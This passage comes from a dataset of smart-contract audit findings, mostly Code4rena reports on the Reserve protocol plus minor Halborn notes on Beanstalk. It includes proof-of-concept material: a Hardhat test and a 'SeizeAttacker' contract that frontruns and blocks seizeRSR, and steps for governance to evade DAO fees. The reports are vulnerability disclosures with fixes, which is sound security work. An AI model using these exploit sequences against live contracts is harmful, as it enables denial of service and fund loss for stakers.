stRSR.exchangeRate()).to.be.lte(fp(\"1e9\"));\n  expect(await stRSR.totalSupply()).to.equal(stakeAmt);\n  expect(await stRSR.balanceOf(addr1.address)).to.equal(stakeAmt);\n\n  //////////////////////////////////////////////////////////////////////////////////////\n  ///                                                                                ///\n  /// Step 3: Now that the rates are unsafe, we can start a proposal to reset stakes ///\n  /// We will have to delegate some votes in order for the proposal to succeed       ///\n  ///                                                                                ///\n  //////////////////////////////////////////////////////////////////////////////////////\n\n  await stRSRVotes.connect(addr1).delegate(addr1.address);\n  await advanceBlocks(2);\n\n  // Proposal info\n  let encodedFunctionCall =\n    stRSRVotes.interface.encodeFunctionData(\"resetStakes\");\n  let proposalDescription = \"Proposal #1 - Reset stakes\";\n  let proposalDescHash = ethers.utils.keccak256(\n    ethers.utils.toUtf8Bytes(proposalDescription)\n  );\n\n  // Propose\n  const proposeTx = await governor\n    .connect(addr1)\n    .propose(\n      [stRSRVotes.address],\n      [0],\n      [encodedFunctionCall],\n      proposalDescription\n    );\n\n  const proposeReceipt = await proposeTx.wait(1);\n  const proposalId = proposeReceipt.events![0].args!.proposalId;\n\n  // Proposal created\n  expect(await governor.state(proposalId)).to.equal(ProposalState.Pending);\n\n  // Advance time to start voting\n  await advanceBlocks(VOTING_DELAY + 1);\n  expect(await governor.state(proposalId)).to.equal(ProposalState.Active);\n\n  await governor.connect(addr1).castVote(proposalId, 1);\n  await advanceBlocks(1);\n\n  // Advance time till voting is complete\n  await advanceBlocks(VOTING_PERIOD + 1);\n  expect(await governor.state(proposalId)).to.equal(ProposalState.Succeeded);\n\n  // Queue proposal\n  await governor\n    .connect(addr1)\n    .queue([stRSRVotes.address], [0], [encodedFunctionCall], proposalDescHash);\n\n  // Check proposal state\n  expect(await governor.state(proposalId)).to.equal(ProposalState.Queued);\n\n  // Advance time required by timelock\n  await advanceTime(MIN_DELAY + 1);\n  await advanceBlocks(1);\n\n  //////////////////////////////////////////////////////////////////////////////\n  ///                                                                        ///\n  /// The execution will revert because the era changes during the execution ///\n  ///                                                                        ///\n  //////////////////////////////////////////////////////////////////////////////\n\n  await expect(\n    governor\n      .connect(addr1)\n      .execute(\n        [stRSRVotes.address],\n        [0],\n        [encodedFunctionCall],\n        proposalDescHash\n      )\n  ).to.be.revertedWith(\"TimelockController: underlying transaction reverted\");\n\n  // We can see that the proposal is still queued\n  expect(await governor.state(proposalId)).to.equal(ProposalState.Queued);\n});\n\n```\n\n</details>\n\n### Impact and Likelihood\n\nThe impact of this issue is **MEDIUM**, as under usual conditions, an impactful governance action would be unavailable. Since the probability of the stake rates being over/under max/min safe stake rate is low ([as per inline docs](https://github.com/code-423n4/2024-07-reserve/blob/main/contracts/p1/StRSR.sol#L489)), but the probability of the issue taking place is high, the likelihood of this issue is judged **MEDIUM**, hence the **MEDIUM** severity of this issue.\n\n### Recommendation\n\nConsider changing the order of `super._execute` and the `startedInSameEra` check in the [`Governance::_execute`](https://github.com/code-423n4/2024-07-reserve/blob/main/contracts/plugins/governance/Governance.sol#L143-L144) function:\n\n```diff\n    function _execute(\n        uint256 proposalId,\n        address[] memory targets,\n        uint256[] memory values,\n        bytes[] memory calldatas,\n        bytes32 descriptionHash\n    ) internal override(Governor, GovernorTimelockControl) {\n+       require(startedInSameEra(proposalId), \"new era\");\n        super._execute(proposalId, targets, values, calldatas, descriptionHash);\n-       require(startedInSameEra(proposalId), \"new era\");\n    }\n```\n\n**[akshatmittal (Reserve) confirmed](https://github.com/code-423n4/2024-07-reserve-findings/issues/36#issuecomment-2312334650)**\n\n**[Reserve mitigated](https://github.com/code-423n4/2024-09-reserve-mitigation?tab=readme-ov-file#findings-being-mitigated)**\n\n**Status:** Mitigation confirmed. Full details in reports from [Bauchibred](https://github.com/code-423n4/2024-09-reserve-mitigation-findings/issues/4), [ether_sky](https://github.com/code-423n4/2024-09-reserve-mitigation-findings/issues/26) and [RadiantLabs](https://github.com/code-423n4/2024-09-reserve-mitigation-findings/issues/15).\n\n***\n\n",
      "summary": "\nThe report discusses a bug in the `StRSR` contract which contains a function called `resetStakes` that is used to reset the staking of a specific RToken system. This function is only accessible to the governance and is used when the stake rate becomes unsafe. However, due to a check in the `Governance` contract, it is impossible for the function to be called as it would increment the era and fail the check. The impact of this issue is medium and the likelihood is also medium, making the severity of the issue medium as well. The recommendation is to change the order of the `super._execute` and `startedInSameEra` check in the `Governance::_execute` function to mitigate the issue. The Reserve team has confirmed the mitigation and is working on resolving the issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2024-07-reserve",
      "github_link": "https://github.com/code-423n4/2024-07-reserve-findings/issues/36",
      "tags": [],
      "finders": [
        "krikolkk"
      ]
    },
    {
      "id": "41011",
      "title": "[M-02] Broken assumptions can lead to the inability to seize RSR",
      "impact": "MEDIUM",
      "content": "\nThe `seizeRSR` [function](https://github.com/code-423n4/2024-07-reserve/blob/main/contracts/p1/StRSR.sol#L424) takes RSR from the staking contract when `BackingManager` wants to sell RSR, [but it does not have enough](https://github.com/code-423n4/2024-07-reserve/blob/main/contracts/p1/BackingManager.sol#L161). In this case, the stakers can lose a portion of their stake in order to keep the system healthy. However, an issue arises from broken assumptions about `stakeRSR` and `totalStakes`, which will make the contract unable to seize due to revert.\n\n### Proof of Concept\n\nLet's assume the system becomes unhealthy, and the stakers will start unstaking their tokens in fear of an upcoming reset/seize. Then, the expected event comes, and the `BackingManager` tries to seize RSR from the staking contract.\n\nThis action is frontran however, with the last staker who:\n\n1.  unstakes everything\n2.  stakes one token\n3.  stakes one token again\n\nLet's examine how does this break `seizeRSR`.\n\n1.  During the `unstake` [call](https://github.com/code-423n4/2024-07-reserve/blob/main/contracts/p1/StRSR.sol#L259):\n    *   `_payoutRewards` is called. Since `totalStakes` is still above `1e18`, `stakeRSR` can be increased and become greater than `totalStakes`. Let's assume that `totalStakes` would be `1000e18` and `stakeRSR` would end at `1001e18` after this step.\n    *   Now, the `stakeRate` would be updated. Since `stakeRSR` is not zero yet, and so is not `totalStakes`, it would be set to\n        ```Solidity\n          uint192((totalStakes * FIX_ONE_256 + (stakeRSR - 1)) / stakeRSR)\n        ```\n        which translates to\n        ```Solidity\n          uint192((1000e18 * 1e18 + (1001e18 - 1)) / 1001e18)\n        ```\n        resulting in `999000999000999001`\n    *   `totalStakes` would be decreased in `_burn` by `1000e18` to zero, which would result in `stakeRSR` being set to zero\n2.  During the `stake` [call](https://github.com/code-423n4/2024-07-reserve/blob/main/contracts/p1/StRSR.sol#L227):\n    *   `payoutRewards` is skipped because it was already called in this block\n    *   `newTotalStakes` in `mintStakes` is calculated as `(stakeRate * newStakeRSR) / FIX_ONE`, which translates to `(stakeRate * (stakeRSR + rsrAmount)) / FIX_ONE` which translates to `(999000999000999001 * (0 + 1)) / 1e18` resulting in 0, meaning 0 tokens are minted and `totalStakes` remains 0\n    *   `stakeRSR` is increased by 1\n3.  The second `stake` call will have the same effects\n    *   after this call, the `stakeRate` is `999000999000999001`, `totalStakes` is 0, and `stakeRSR` is 2 (note that this breaks [this assumption](https://github.com/code-423n4/2024-07-reserve/blob/main/contracts/p1/StRSR.sol#L619-L620))\n4.  Now we examine the important parts of the `seizeRSR` call\n    *   `stakeRSRToTake` is set to `(2 * rsrAmount + (rsrBalance - 1)) / rsrBalance`, which will result in 1 every time the we are not seizing more than half of the total balance of the contract\n    *   `stakeRSR` is therefore set to 1, and since it is non-zero, `stakeRate` is updated to `uint192((FIX_ONE_256 * totalStakes + (stakeRSR - 1)) / stakeRSR)`, which translates to `uint192((1e18 * 0 + (1 - 1)) / 1)` which comes to 0\n    *   the rest of the call is not important until it comes to\n        ```Solidity\n        emit ExchangeRateSet(initRate, exchangeRate());\n        ```\n    *   Here, we can see that the call returns\n        ```Solidity\n        return (FIX_SCALE_SQ + (stakeRate / 2)) / stakeRate;\n        ```\n    *   since `stakeRate` was updated to 0 before, the call will revert\n\n### Impact and Likelihood\n\nThe likelihood of this issue is **LOW**. The impact seems somewhere between **HIGH** and **MEDIUM** since a necessary rebalance action can be DoSed until it is noticed and an action is taken. Considering that the issue is possible due to a broken invariant, the severity should be judged as **MEDIUM**.\n\n### Recommendation\n\nOne way to fix the issue would be to enforce the invariant `if totalStakes == 0, then stakeRSR == 0`. This could be done by assuring that `amount` is not 0 in [`_mint`](https://github.com/code-423n4/2024-07-reserve/blob/main/contracts/p1/StRSR.sol#L842).\n\n```diff\n    function _mint(address account, uint256 amount) internal virtual {\n        _notZero(account);\n+       _notZero(amount);\n        assert(totalStakes + amount < type(uint224).max);\n\n        stakes[era][account] += amount;\n        totalStakes += amount;\n\n        emit Transfer(address(0), account, amount);\n        _afterTokenTransfer(address(0), account, amount);\n    }\n```\n\nAnother mitigation could be to update the [`seizeRSR`](https://github.com/code-423n4/2024-07-reserve/blob/main/contracts/p1/StRSR.sol#L446-L449) function to update the `stakeRate` only if both `stakeRSR` and `totalStakes` are non-zero or update the `stakeRate` to `FIX_ONE` if either of these two is zero.\n\n**[tbrent (Reserve) commented](https://github.com/code-423n4/2024-07-reserve-findings/issues/39#issuecomment-2310758715):**\n > This is a plausible issue. We would like to request a coded PoC from the warden, since it is about a very specific numeric case. \n\n**[cccz (judge) commented](https://github.com/code-423n4/2024-07-reserve-findings/issues/39#issuecomment-2317533058):**\n > Since the initial judging time is not enough to verify it, consider it valid first and keep open, and wait for the PoC from warden.<br>\n> And may invalidate it without further proof.\n\n**[akshatmittal (Reserve) commented](https://github.com/code-423n4/2024-07-reserve-findings/issues/39#issuecomment-2318327964):**\n > Just noting that we currently think this is _not_ possible but might be _plausible_ in super specific circumstances which is why we're requesting the PoC.\n\n**[krikolkk (warden) commented](https://github.com/code-423n4/2024-07-reserve-findings/issues/39#issuecomment-2318605677):**\n > Hi @akshatmittal @tbrent - The PoC in the issue is wrong; however, the issue exists. Below I attach the updated PoC with a test proving the issue. Under those conditions `seizeRSR` will be dosed due to a broken protocol invariant.\n> \n> <details>\n> Let's assume the system becomes unhealthy, and the stakers will start unstaking their tokens in fear of an upcoming reset/seize. Then the following chain of action happens:\n> \n> 1. The last staker unstakes everything but one token so `_payoutRewards` updates `stakeRSR`\n> 2. Stake rate is below `5e17` - this can happen natuarally or forcefully (in our scenario everybody unstaked so we can influence it in some way)\n> 3. `BackingManager` tries to seize RSR from the staking contract, but this transaction is frontran with another transaction in which\n>   1. The last staker unstakes the last token\n>   2. The last staker stakes 2 wei \n> \n> What will happen is that\n> \n> 1. During the `unstake` [call](https://github.com/code-423n4/2024-07-reserve/blob/main/contracts/p1/StRSR.sol#L259):\n>    - `_payoutRewards` is called. Since `totalStakes` is still above `1e18`, `stakeRSR` can be increased and become greater than `totalStakes`. \n>    - This will influence the new `stakeRate`. If this becomes less than `5e17`, the problem arises\n> 2. During the `stake` [call](https://github.com/code-423n4/2024-07-reserve/blob/main/contracts/p1/StRSR.sol#L227):\n>    - `payoutRewards` is skipped because it was already called in this block\n>    - `newTotalStakes` in `mintStakes` is calculated as `(stakeRate * newStakeRSR) / FIX_ONE`, which translates to `(stakeRate * (stakeRSR + rsrAmount)) / FIX_ONE` which translates to `(499999999999999999 * (0 + 2)) / 1e18` resulting in 0, meaning 0 tokens are minted and `totalStakes` remains 0\n>    - `stakeRSR` is increased by 2\n>    - Note that `499999999999999999` is the greatest possible value of `stakeRate` when the issue arises\n>    - in the end we can see that `totalStakes` is 0, and `stakeRSR` is 2 (note that this breaks [this assumption](https://github.com/code-423n4/2024-07-reserve/blob/main/contracts/p1/StRSR.sol#L619-L620))\n> 3. Now we examine the important parts of the `seizeRSR` call\n>    - `stakeRSRToTake` is set to `(2 * rsrAmount + (rsrBalance - 1)) / rsrBalance`, which will result in 1 every time the we are not seizing more than half of the total balance of the contract\n>    - `stakeRSR` is therefore set to 1, and since it is non-zero, `stakeRate` is updated to `uint192((FIX_ONE_256 * totalStakes + (stakeRSR - 1)) / stakeRSR)`, which translates to `uint192((1e18 * 0 + (1 - 1)) / 1)` which comes to 0\n>    - the rest of the call is not important until it comes to\n>      ```Solidity\n>      emit ExchangeRateSet(initRate, exchangeRate());\n>      ```\n>    - Here, we can see that the call returns\n>      ```Solidity\n>      return (FIX_SCALE_SQ + (stakeRate / 2)) / stakeRate;\n>      ```\n>    - since `stakeRate` was updated to 0 before, the call will revert here\n> \n> The following test showcases the issue with different numbers:\n> \n> ```TypeScript\n> it.only(\"Unable to seize RSR\", async () => {\n>   const stakeAmt: BigNumber = bn(\"5000e18\");\n>   const unstakeAmt: BigNumber = bn(\"4999e18\");\n>   const one: BigNumber = bn(\"1e18\");\n>   const rewards: BigNumber = bn(\"100e18\");\n>   const seizeAmount: BigNumber = bn(\"2499e18\");\n> \n>   // 1. Stake\n>   await rsr.connect(addr1).approve(stRSR.address, stakeAmt);\n>   await stRSR.connect(addr1).stake(stakeAmt);\n> \n>   // 2. Decrease stakeRate to ~5e17 - 1\n>   await rsr.connect(owner).mint(stRSR.address, rewards);\n>   await advanceToTimestamp((await getLatestBlockTimestamp()) + 1);\n>   await stRSR.payoutRewards();\n>   await advanceToTimestamp((await getLatestBlockTimestamp()) + 86400);\n>   await stRSR.payoutRewards();\n> \n>   // 3. Unstake everything but 1e18\n>   await stRSR.connect(addr1).unstake(unstakeAmt);\n>   await advanceToTimestamp((await getLatestBlockTimestamp()) + 172800);\n> \n>   // 4. Unstake the last token then stake 2 wei\n> \n>   // everything must happen in 1 tx thats why we deploy `SeizeAttacker`\n>   const SeizeAttackerFactory = await ethers.getContractFactory(\"SeizeAttacker\");\n>   let seizeAttacker = await SeizeAttackerFactory.deploy();\n> \n>   // transfer stRSR to the seize attacker so it can unstake\n>   await stRSR.connect(addr1).transfer(seizeAttacker.address, one);\n>   await rsr.connect(owner).mint(seizeAttacker.address, 2);\n>   await seizeAttacker.doIt(stRSR.address, rsr.address, one);\n> \n>   // 5. seize rsr fails\n>   await setStorageAt(stRSR.address, 256, addr1.address); // set addr1 as backing manager so we can call seize rsr easily\n>   await stRSR.connect(addr1).seizeRSR(seizeAmount);\n> });\n> ```\n> \n> We will see that the test will fail with the following output\n> \n> ```console\n>   Error: VM Exception while processing transaction: reverted with panic code 0x12 (Division or modulo division by zero)\n> ```\n> </details>\n\n**[akshatmittal (Reserve) commented](https://github.com/code-423n4/2024-07-reserve-findings/issues/39#issuecomment-2318618493):**\n > Hey @krikolkk, thanks for that. Can you please share the code for `SeizeAttacker` contract and replace the last call with impersonating `BackingManager` instead? (So I'm able to reproduce this)\n\n**[krikolkk (warden) commented](https://github.com/code-423n4/2024-07-reserve-findings/issues/39#issuecomment-2318658821):**\n > @akshatmittal - mb, forgot about that.\n> \n> <details>\n> \n> ```Solidity\n> // SPDX-License-Identifier: MIT\n> pragma solidity ^0.8.19;\n> \n> interface IStRSR {\n>     function stake(uint256 rsrAmount) external;\n>     function unstake(uint256 stakeAmount) external;\n> }\n> \n> interface RSR {\n>     function approve(address who, uint256 amount) external;\n> }\n> \n> contract SeizeAttacker {\n> \n>     function doIt(address stRSR,address rsr, uint amount) external {\n>         // unstake\n>         IStRSR(stRSR).unstake(amount);\n>         // approve\n>         RSR(rsr).approve(stRSR, 2);\n>         // stake 1\n>         IStRSR(stRSR).stake(2);\n>     }\n> \n> }\n> ```\n> \n> In the test we set `addr1` as backing manager so `addr1` can call the method, the test should work.\n> </details>\n\n**[akshatmittal (Reserve) commented](https://github.com/code-423n4/2024-07-reserve-findings/issues/39#issuecomment-2319046215):**\n > Accepted.\n> \n> Specifically, want to point out that the following must be true:\n> 1. Last staker in the pool.\n> 2. `stakeRate` is \\< `5e17 - 1`\n> 3. Alone has \\> `minTradeVolume` worth of RSR, or total drafts \\> `minTradeVolume`. ([Acceptable Values](https://github.com/reserve-protocol/protocol/blob/468df052524e6181a723cd9bdd027add7a1cc4bb/docs/deployment-variables.md?plain=1#L25))\n> 4. Able to frontrun the seize call.\n\n**[krikolkk (warden) commented](https://github.com/code-423n4/2024-07-reserve-findings/issues/39#issuecomment-2320060974):**\n > @akshatmittal - the volume can be cumulated with other stakers who already unstaked. The main problem here is that we are breaking a protocol variant, as shown in the PoC, hence the code behaves unexpectedly.\n\n**[Reserve mitigated](https://github.com/code-423n4/2024-09-reserve-mitigation?tab=readme-ov-file#findings-being-mitigated)**\n\n**Status:** Mitigation confirmed. Full details in reports from [Bauchibred](https://github.com/code-423n4/2024-09-reserve-mitigation-findings/issues/3), [RadiantLabs](https://github.com/code-423n4/2024-09-reserve-mitigation-findings/issues/37) and [ether_sky](https://github.com/code-423n4/2024-09-reserve-mitigation-findings/issues/25).\n\n***\n\n",
      "summary": "\nThe `seizeRSR` function is not working properly and can lead to a loss of staked RSR tokens. This happens when the `BackingManager` tries to sell RSR but does not have enough. The issue is caused by incorrect assumptions about `stakeRSR` and `totalStakes` in the `seizeRSR` function. This can be triggered by a specific sequence of actions by the last staker in the pool. The impact of this issue is considered medium to high and the likelihood is low. The recommended fix is to enforce an invariant or update the `seizeRSR` function. The issue has been confirmed and mitigated by the Reserve team.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2024-07-reserve",
      "github_link": "https://github.com/code-423n4/2024-07-reserve-findings/issues/39",
      "tags": [],
      "finders": [
        "krikolkk"
      ]
    },
    {
      "id": "41010",
      "title": "[M-01] RToken can manipulate distribution to avoid paying DAO fees",
      "impact": "MEDIUM",
      "content": "\nRevenue produced by RTokens is sold for both RSR and RTokens according to a distribution defined in the [`Distributor`](https://github.com/code-423n4/2024-07-reserve/blob/3f133997e186465f4904553b0f8e86ecb7bbacbf/contracts/p1/Distributor.sol). The `BackingManager` [splits](https://github.com/code-423n4/2024-07-reserve/blob/3f133997e186465f4904553b0f8e86ecb7bbacbf/contracts/p1/BackingManager.sol#L247-L261) the collateral tokens to be sold proportionately to the RSR/RToken distribution ratio and sends them to the `rsrTrader` and `rTokenTrader`. When trades settle, the obtained RSR or RTokens are sent to the `Distributor`, which distributes them no longer according to the RSR/RToken ratio but to the different destinations for the specific token. The sum of all destinations for each token is used to derive the ratio.\n\nThe DAO fee is added to the RSR share of the initial split and paid when RSR is distributed.\n\nHowever, the current implementation allows governance to manipulate the distribution settings without much effort in a way that can significantly reduce the amount of DAO fees paid.\n\nThis can be achieved through a combination of two different root causes:\n\n*   an RSR destination can be added that prevents rewards from being immediately distributed\n*   the RSR/RToken ratio is calculated twice: once in the  `BackingManager`, and once in the `Distributor`, and it is can be modified between the two\n\nEssentially, the distribution can be set in a way that temporarily accumulates RSR revenue in in the `rsrTrader` according to one RSR/RToken ratio, and then later redistributed with a different ratio.\n\n### Impact\n\nRTokens can avoid paying most of the DAO fee\n\n### Proof of Concept\n\nAssuming a 10% DAO fee, governance can execute the following steps to pay only about 1% in fees:\n\n1.  Set the distribution such that `rsrTotal == 0` before DAO fees [are added](https://github.com/code-423n4/2024-07-reserve/blob/3f133997e186465f4904553b0f8e86ecb7bbacbf/contracts/p1/Distributor.sol#L221).\n2.  Add the RSR token itself as a distribution target. Like stRSR, [RSR](https://etherscan.io/token/0x320623b8e4ff03373931769a31fc52a4e78b5d70#code) does not allow transferring to itself, so the distribution will always fail.\n3.  10% of revenue will accumulate as RSR in the `rsrTrader`.\n4.  After some time, change the distribution such that `rTokenTotal == 0` and add another destination with non-zero `rsrDist` (e.g., `stRSR`).\n5.  Remove RSR as a distribution target and call `rsrTrader.distributeTokenToBuy()`.\n6.  Only 10% of the accumulated RSR will go to the DAO, which is effectively 1% of the total revenue.\n7.  Repeat this process as needed.\n\n### Recommended Mitigation Steps\n\nDisallowing RSR as a distribution token prevents this to a large extent.\n\n**[cccz (judge) commented](https://github.com/code-423n4/2024-07-reserve-findings/issues/53#issuecomment-2317900788):**\n > Will try to get the sponsor's opinion, and will set it to valid before the sponsor responds.<br>\n> It's about Malicious Governance, though it actually compromises the DAO, so it's probably a privilege escalation.\n\n**[akshatmittal (Reserve) disputed and commented](https://github.com/code-423n4/2024-07-reserve-findings/issues/53#issuecomment-2318254246):**\n > This is a known issue, changing Distributions in a specific way can change what is actually paid out to veRSR. See publicly known issues as well as the Trust report specifically.\n\n**[tbrent (Reserve) commented](https://github.com/code-423n4/2024-07-reserve-findings/issues/53#issuecomment-2319277727):**\n > The way I'm seeing it: a new finding (RSR self-entries in the distributor table cause distribution to revert) raises the previously known issue [TRST-L-2](https://github.com/code-423n4/2024-07-reserve/blob/main/audits/Reserve_PR_4_0_0_v1.pdf) in severity from Low to Medium, due to what is effectively privilege escalation by avoiding paying the DAO fee. \n\n**[Reserve mitigated](https://github.com/code-423n4/2024-09-reserve-mitigation?tab=readme-ov-file#findings-being-mitigated)**\n\n**Status:** Mitigation confirmed. Full details in reports from [Bauchibred](https://github.com/code-423n4/2024-09-reserve-mitigation-findings/issues/2), [ether_sky](https://github.com/code-423n4/2024-09-reserve-mitigation-findings/issues/24) and [RadiantLabs](https://github.com/code-423n4/2024-09-reserve-mitigation-findings/issues/14).\n\n***\n\n",
      "summary": "\nThe bug report discusses a vulnerability in the code for the Reserve protocol, which allows governance to manipulate the distribution settings and avoid paying the required DAO fees. This can be done by adding the RSR token as a distribution target and changing the distribution settings in a specific way. This can result in only a small portion of the DAO fees being paid instead of the full amount. The bug has been confirmed and is being mitigated by the Reserve team. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2024-07-reserve",
      "github_link": "https://github.com/code-423n4/2024-07-reserve-findings/issues/53",
      "tags": [],
      "finders": [
        "RadiantLabs"
      ]
    },
    {
      "id": "50533",
      "title": "UNNEEDED INITIALIZATION OF UINT256 VARIABLES TO 0",
      "impact": "LOW",
      "content": "##### Description\n\nAs `i` is an `uint256`, it is already initialized to 0. `uint256 i = 0` reassigns the 0 to `i` which wastes gas.\n\nCode Location\n-------------\n\nInternalizer.sol\n\n* Line 62:\n  `for (uint256 i = 0; i < accounts.length; i++) {`\n\nFertilizer.sol\n\n* Line 77:\n  `for (uint256 i = 0; i < ids.length; i++) {`\n* Line 90:\n  `for (uint256 i = 0; i < ids.length; i++) {`\n* Line 99:\n  `for (uint256 i = 0; i < ids.length; i++) {`\n\nFertilizer1155.sol\n\n* Line 67:\n  `for (uint256 i = 0; i < ids.length; ++i) {`\n\nTokenSilo.sol\n\n* Line 210:\n  `for (uint256 i = 0; i < seasons.length; i++) {`\n* Line 268:\n  `for (uint256 i = 0; i < seasons.length; i++) {`\n* Line 325:\n  `for (uint256 i = 0; i < seasons.length; i++) {`\n\nSiloFacet.sol\n\n* Line 140:\n  `for (uint256 i = 0; i < seasons.length; ++i) {`\n\nTokenFacet.sol\n\n* Line 82:\n  `for (uint256 i = 0; i < tokens.length; i++) {`\n* Line 103:\n  `for (uint256 i = 0; i < tokens.length; i++) {`\n* Line 124:\n  `for (uint256 i = 0; i < tokens.length; i++) {`\n* Line 147:\n  `for (uint256 i = 0; i < tokens.length; i++) {`\n\nFieldFacet.sol\n\n* Line 84:\n  `for (uint256 i = 0; i < plots.length; i++) {`\n\nFarmFacet.sol\n\n* Line 44:\n  `for (uint256 i = 0; i < data.length; i++) {`\n\nCurveFacet.sol\n\n* Line 109:\n  `for (uint256 i = 0; i < nCoins; ++i) {`\n* Line 167:\n  `for (uint256 i = 0; i < nCoins; i++)`\n* Line 174:\n  `for (uint256 i = 0; i < nCoins; i++)`\n* Line 186:\n  `for (uint256 i = 0; i < nCoins; i++)`\n* Line 191:\n  `for (uint256 i = 0; i < nCoins; ++i) {`\n* Line 246:\n  `for (uint256 i = 0; i < nCoins; ++i) {`\n* Line 296:\n  `for (uint256 _i = 0; _i < 4; ++_i) {`\n* Line 313:\n  `for (uint256 _i = 0; _i < 8; ++_i) {`\n* Line 329:\n  `for (uint256 _i = 0; _i < 4; ++_i) {`\n\nLibPlainCurveConvert.sol\n\n* Line 79:\n  `for (uint256 k = 0; k < 256; k++) {`\n\nLibCurve.sol\n\n* Line 56:\n  `for (uint256 _i = 0; _i < N_COINS; _i++) {`\n* Line 68:\n  `for (uint256 _i = 0; _i < 255; _i++) {`\n* Line 85:\n  `for (uint256 _i = 0; _i < xp.length; _i++) {`\n* Line 92:\n  `for (uint256 _i = 0; _i < 256; _i++) {`\n* Line 94:\n  `for (uint256 _j = 0; _j < xp.length; _j++) {`\n\nLibIncentive.sol\n\n* Line 34:\n  `for (uint256 i = 0; i < p; ++i) {`\n\n##### Score\n\nImpact: 1  \nLikelihood: 1\n\n##### Recommendation\n\n**SOLVED**: `Beanstalk team` followed Halborn's suggestion reducing the gas costs.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "Beanstalk",
      "source_link": "https://www.halborn.com/audits/beanstalk/beanstalk-smart-contract-security-assessment",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "50532",
      "title": "INITIALIZE FUNCTION IN FERTILIZER CONTRACT CAN BE REMOVED",
      "impact": "LOW",
      "content": "##### Description\n\nCurrently, the [FertilizerPreMint](https://etherscan.io/address/0xb151ea73053386b8d0367c401ee58a06e07ea680#code) contract is deployed behind a [TransparentUpgradeableProxy](https://etherscan.io/address/0x402c84De2Ce49aF88f5e2eF3710ff89bFED36cB6).\n\nAfter the replanting, when Beanstalk is unpaused, the BCM will call the function `addFertilizerOwner()` which will handle the process of adding BEAN:3CRV liquidity and minting new Deposited Beans for all the Fertilizer minted prior to unpause.\n\nAt the same time, the [TransparentUpgradeableProxy](https://etherscan.io/address/0x402c84De2Ce49aF88f5e2eF3710ff89bFED36cB6) contract will be upgraded to a new `Fertilizer` contract, instead of the [FertilizerPreMint](https://etherscan.io/address/0xb151ea73053386b8d0367c401ee58a06e07ea680#code) implementation used before. This will move the `mintFertilizer()` functionality to Beanstalk itself, instead of happening in the `FertilizerPreMint` contract.\n\nAt this point, Beanstalk will automatically add new liquidity for Unripe LP holders and new Beans in the same transaction as when Fertilizer is minted.\n\nThe new `Fertilizer` contract that will be used contains an `initialize()` function:\n\n#### Fertilizer.sol\n\n```\nfunction decreaseInternalBalance(\nfunction initialize() public initializer { //@audit can be removed\n    __Internallize_init(\"\");\n}\n\n```\n\nAs the `TransparentUpgradeableProxy` holds all the storage variables and will be already initialized in the `FertilizerPreMint` implementation, any call to this function will revert as the contract will be already initialized, hence this `initialize()` function can be removed from the `Fertilizer` contract.\n\n##### Score\n\nImpact: 1  \nLikelihood: 1\n\n##### Recommendation\n\n**SOLVED**: `Beanstalk team` removed the `initialize()` function from the `Fertilizer` contract.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "Beanstalk",
      "source_link": "https://www.halborn.com/audits/beanstalk/beanstalk-smart-contract-security-assessment",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "50531",
      "title": "REQUIRE STATEMENT TYPOS",
      "impact": "LOW",
      "content": "##### Description\n\nIn the following require statements some typos were detected:\n\nLibBalance.sol\n\n* Line 73:\n  `require(allowPartial || (currentBalance >= amount), \"Balance: Insufficnent internal balance\");`\n\nTokenSilo.sol\n\n* Line 285:\n  `require(season <= s.season.current, \"Claim: Withdrawal not recievable.\");`\n\nLibFertilizer.sol\n\n* Line 153:\n  `require(s.activeFertilizer == 0, \"Still active fertliizer\");`\n\n##### Score\n\nImpact: 1  \nLikelihood: 1\n\n##### Recommendation\n\n**SOLVED**: `Beanstalk team` corrected the typos suggested.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "Beanstalk",
      "source_link": "https://www.halborn.com/audits/beanstalk/beanstalk-smart-contract-security-assessment",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "50530",
      "title": "SAFETRANSFER IS NOT USED FOR ALL THE TOKEN TRANSFERS",
      "impact": "LOW",
      "content": "##### Description\n\n[SafeERC20.safeTransferFrom()](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/utils/SafeERC20.sol) is used in all the code base. Although in the `LibTransfer.transferToken()` function, the standard `ERC20.transferFrom()` is still used.\n\nCode Location\n-------------\n\n#### LibTransfer.sol\n\n```\nfunction transferToken(\n    IERC20 token,\n    address recipient,\n    uint256 amount,\n    From fromMode,\n    To toMode\n) internal returns (uint256 transferredAmount) {\n    if (fromMode == From.EXTERNAL && toMode == To.EXTERNAL) {\n        token.transferFrom(msg.sender, recipient, amount);\n        return amount;\n    }\n    amount = receiveToken(token, amount, msg.sender, fromMode);\n    sendToken(token, amount, recipient, toMode);\n    return amount;\n}\n\n```\n\n##### Score\n\nImpact: 1  \nLikelihood: 1\n\n##### Recommendation\n\n**SOLVED**: `Beanstalk team` uses now `SafeERC20` in all the token transfers.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "Beanstalk",
      "source_link": "https://www.halborn.com/audits/beanstalk/beanstalk-smart-contract-security-assessment",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "50529",
      "title": "CRITICAL DEPENDENCY ON CURVE METAPOOL FACTORIES",
      "impact": "LOW",
